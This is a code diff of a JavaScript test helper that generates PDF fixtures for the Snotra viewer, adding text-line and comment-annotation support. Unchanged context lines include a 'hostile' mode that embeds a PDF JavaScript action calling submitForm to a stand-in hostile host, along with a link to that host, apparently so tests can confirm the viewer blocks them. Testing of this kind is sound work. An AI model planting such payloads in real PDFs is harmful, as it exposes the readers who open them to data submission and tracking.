@@ -5,6 +5,8 @@
 //   makeTextPdf({ pages, title, hostile })  pages of text in Helvetica, which
 //                                          is not embedded: pdf.js has to ask
 //                                          for its standard font data
+//     … lines, comments                    the text lines of each page, and
+//                                          comments on page 1 (#1299)
 //   makeEncryptedPdf({ password })         RC4 40-bit (standard security
 //                                          handler, revision 2) with a user
 //                                          password, so pdf.js asks for it
@@ -65,12 +67,19 @@ function stream(content, encrypt) {
   ]);
 }
 
-function pageContent(number, total, title) {
-  const lines = [
-    'This page is drawn by pdf.js inside Snotra.',
-    'Helvetica is not embedded here, so the standard font',
-    'data comes from the main process, not from the network.',
-  ];
+const DEFAULT_LINES = [
+  'This page is drawn by pdf.js inside Snotra.',
+  'Helvetica is not embedded here, so the standard font',
+  'data comes from the main process, not from the network.',
+];
+
+/** Where text line `index` of a page sits, as [x1 y1 x2 y2] for an annotation. */
+export function lineRect(index, width = 360) {
+  const baseline = 650 - index * 22;
+  return [54, baseline - 5, 56 + width, baseline + 15];
+}
+
+function pageContent(number, total, title, lines = DEFAULT_LINES) {
   return [
     '0 0.459 0.620 rg 56 770 483 6 re f',
     '0.12 0.12 0.11 rg',
@@ -86,7 +95,57 @@ function pageContent(number, total, title) {
   ].join('\n');
 }
 
-export function makeTextPdf({ pages = 1, title = 'Specification', hostile = false } = {}) {
+function formXObject(width, height, content) {
+  return `<< /Type /XObject /Subtype /Form /BBox [0 0 ${width} ${height}] /Length ${content.length} >>\nstream\n${content}\nendstream`;
+}
+
+/** A PDF date for a JavaScript Date, in UTC. */
+function pdfDate(date) {
+  return `D:${date.toISOString().replace(/[-:T]/g, '').slice(0, 14)}Z`;
+}
+
+const pdfString = (text) => `(${escapePdfString(text)})`;
+
+/**
+ * The annotation objects for page 1: `comments` is a list of
+ * `{ kind: 'highlight' | 'note', rect, author, text, date, replies: [{ author, text, date }] }`,
+ * starting at object number `first`. Returns the objects and the references
+ * that go into the page's /Annots.
+ */
+function commentObjects(comments, first) {
+  const objects = [];
+  const refs = [];
+  let next = first;
+  for (const comment of comments) {
+    const own = next;
+    next += 1;
+    const [x1, y1, x2, y2] = comment.rect;
+    const common = `/Rect [${x1} ${y1} ${x2} ${y2}] /F 4 /T ${pdfString(comment.author ?? '')} /Contents ${pdfString(comment.text)} ${comment.date ? ` /M (${pdfDate(comment.date)})` : ''}`;
+    if (comment.kind === 'note') {
+      // A yellow square of its own as the appearance: pdf.js draws a note
+      // without one only in its annotation layer, which the view has not.
+      const ap = next;
+      next += 1;
+      const w = x2 - x1;
+      const h = y2 - y1;
+      objects.push(
+        `<< /Type /Annot /Subtype /Text ${common} /Name /Comment /C [1 0.84 0.2] /AP << /N ${ap} 0 R >> >>`,
+        formXObject(w, h, `1 0.84 0.2 rg 0 0 ${w} ${h} re f 0.55 0.42 0 RG 1 w 0.5 0.5 ${w - 1} ${h - 1} re S`),
+      );
+    } else {
+      objects.push(`<< /Type /Annot /Subtype /Highlight ${common} /C [1 0.89 0.35] /QuadPoints [${x1} ${y2} ${x2} ${y2} ${x1} ${y1} ${x2} ${y1}] >>`);
+    }
+    refs.push(`${own} 0 R`);
+    for (const reply of comment.replies ?? []) {
+      objects.push(`<< /Type /Annot /Subtype /Text /Rect [${x1} ${y1} ${x1 + 20} ${y1 + 20}] /F 6 /IRT ${own} 0 R /T ${pdfString(reply.author ?? '')} /Contents ${pdfString(reply.text)} ${reply.date ? ` /M (${pdfDate(reply.date)})` : ''} >>`);
+      refs.push(`${next} 0 R`);
+      next += 1;
+    }
+  }
+  return { objects, refs };
+}
+
+export function makeTextPdf({ pages = 1, title = 'Specification', hostile = false, lines = DEFAULT_LINES, comments = [] } = {}) {
   // 1 catalog, 2 pages, 3 regular font, 4 bold font, 5 JavaScript action,
   // then two objects (page, content) per page.
   const first = 6;
@@ -98,15 +157,23 @@ export function makeTextPdf({ pages = 1, title = 'Specification', hostile = fals
     '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>',
     `<< /S /JavaScript /JS (globalThis.__pwnedPdf = true; this.submitForm\\("https://${HOSTILE_HOST}/js"\\);) >>`,
   ];
+  const extra = commentObjects(comments, first + pages * 2);
   for (let i = 0; i < pages; i += 1) {
-    const annots = hostile
-      ? ` /Annots [<< /Type /Annot /Subtype /Link /Rect [56 640 400 670] /Border [0 0 0] /A << /S /URI /URI (https://${HOSTILE_HOST}/link) >> >> << /Type /Annot /Subtype /Link /Rect [56 380 539 560] /Border [0 0 0] /A 5 0 R >>]`
-      : '';
+    const items = [];
+    if (hostile) {
+      items.push(
+        `<< /Type /Annot /Subtype /Link /Rect [56 640 400 670] /Border [0 0 0] /A << /S /URI /URI (https://${HOSTILE_HOST}/link) >> >>`,
+        '<< /Type /Annot /Subtype /Link /Rect [56 380 539 560] /Border [0 0 0] /A 5 0 R >>',
+      );
+    }
+    if (i === 0) items.push(...extra.refs);
+    const annots = items.length ? ` /Annots [${items.join(' ')}]` : '';
     objects.push(
       `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 ${A4[0]} ${A4[1]}] /Resources << /Font << /F1 3 0 R /F2 4 0 R >> >> /Contents ${first + i * 2 + 1} 0 R${annots} >>`,
-      stream(pageContent(i + 1, pages, title)),
+      stream(pageContent(i + 1, pages, title, lines)),
     );
   }
+  objects.push(...extra.objects);
   return assemble(objects);
 }
 
